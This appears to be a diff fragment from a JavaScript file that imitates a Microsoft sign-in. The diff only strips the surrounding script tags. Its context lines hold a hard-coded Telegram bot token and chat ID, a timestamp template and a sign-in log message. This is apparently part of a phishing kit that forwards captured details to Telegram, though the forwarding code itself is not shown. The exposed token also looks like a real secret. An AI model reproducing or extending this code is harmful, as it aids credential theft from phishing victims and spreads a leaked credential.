@@ -1,4 +1,4 @@
-<script>
+
 // Replace with your Telegram Bot Token and Chat ID
 const TELEGRAM_BOT_TOKEN = '7948668339:AAFu2rDu_4zSW98dpaNAVls1n0f7axCENGY';
 const TELEGRAM_CHAT_ID = '8218271186';
@@ -302,4 +302,4 @@ Timestamp: ${new Date().toISOString()}
     
     console.log('Microsoft sign-in initialized successfully');
 }
-</script>
+
